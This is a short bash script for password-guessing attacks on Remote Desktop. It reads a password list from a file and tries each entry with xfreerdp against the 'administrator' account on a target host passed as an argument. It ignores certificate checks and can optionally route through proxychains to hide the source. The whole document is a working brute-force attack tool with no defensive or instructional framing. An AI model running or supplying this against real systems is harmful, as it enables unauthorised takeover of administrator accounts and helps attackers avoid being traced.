#!/bin/bash -v

cat data/password.txt | while read PWD
do 
	#echo proxychains xfreerdp /auth-only /cert-ignore /u:administrator /p:$PWD /v:$1
	if [[ $2 == 'proxy' ]]; then
		proxychains xfreerdp /cert-ignore /u:administrator /p:$PWD /v:$1
	else
		xfreerdp /cert-ignore /u:administrator /p:$PWD /v:$1
	fi
done

